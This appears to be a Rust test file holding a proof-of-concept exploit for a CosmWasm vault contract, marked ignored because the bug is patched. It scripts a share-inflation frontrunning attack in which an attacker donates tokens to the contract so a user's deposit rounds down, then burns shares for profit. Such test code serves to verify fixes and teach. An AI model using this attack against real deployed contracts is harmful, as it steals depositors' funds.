#[cfg(test)]
pub mod tests {
    use cosmwasm_std::{coin, coins, Addr, Uint128};
    use cw_multi_test::Executor;

    use crate::{
        contract::DENOM,
        integration_tests::tests::{mint_tokens, proper_instantiate, USER},
        msg::{ExecuteMsg, QueryMsg},
        state::Balance,
    };

    #[ignore = "bug is patched"]
    #[test]
    fn exploit() {
        let (mut app, contract_addr) = proper_instantiate();

        let attacker = "attacker";

        // record attacker cost
        let mut attacker_cost = Uint128::zero();

        app = mint_tokens(app, attacker.to_owned(), Uint128::new(1));
        attacker_cost += Uint128::new(1);

        // 1. attacker mints one share
        app.execute_contract(
            Addr::unchecked(attacker),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(1, DENOM)],
        )
        .unwrap();

        // query share balance
        let attacker_shares: Balance = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::UserBalance {
                    address: attacker.to_string(),
                },
            )
            .unwrap();
        // assert_eq!(attacker_shares.amount, Uint128::one());

        // verify total supply
        // let config: Config = app
        //     .wrap()
        //     .query_wasm_smart(contract_addr.clone(), &QueryMsg::GetConfig {})
        //     .unwrap();
        // assert_eq!(config.total_supply, Uint128::one());

        // 2. user wants to mint shares
        let user_deposit = Uint128::new(20_000);
        app = mint_tokens(app, USER.to_owned(), user_deposit);

        // 3. attacker frontruns and transfer amount
        let transfer_amount = user_deposit / Uint128::new(2);

        app = mint_tokens(app, attacker.to_owned(), transfer_amount);
        attacker_cost += transfer_amount;

        app.send_tokens(
            Addr::unchecked(attacker),
            contract_addr.clone(),
            &coins(transfer_amount.u128(), DENOM),
        )
        .unwrap();

        // verify contract balance is manipulated
        let contract_balance = app
            .wrap()
            .query_balance(contract_addr.clone(), DENOM)
            .unwrap();
        assert_eq!(contract_balance.amount, attacker_cost);

        // 4. user tx gets through
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(user_deposit.into(), DENOM)],
        )
        .unwrap();

        // user receives one share in the end
        // let user_share: Balance = app
        //     .wrap()
        //     .query_wasm_smart(
        //         contract_addr.clone(),
        //         &QueryMsg::UserBalance {
        //             address: USER.to_string(),
        //         },
        //     )
        //     .unwrap();
        // assert_eq!(user_share.amount, Uint128::one());

        // 5. attacker burns all share

        // before that, we ensure attacker no funds
        let attacker_balance = app
            .wrap()
            .query_balance(attacker.to_string(), DENOM)
            .unwrap();
        assert_eq!(attacker_balance.amount, Uint128::zero());

        // burn all shares
        app.execute_contract(
            Addr::unchecked(attacker),
            contract_addr,
            &ExecuteMsg::Burn {
                shares: attacker_shares.amount,
            },
            &[],
        )
        .unwrap();

        // check profit
        let attacker_balance = app
            .wrap()
            .query_balance(attacker.to_string(), DENOM)
            .unwrap();

        assert!(
            attacker_balance.amount > attacker_cost,
            "attacker_balance.amount: {0}; attacker_cost: {attacker_cost}",
            attacker_balance.amount
        );
        let profit = attacker_balance.amount - attacker_cost;
        println!("Total profit: {:?}", profit);
    }
}
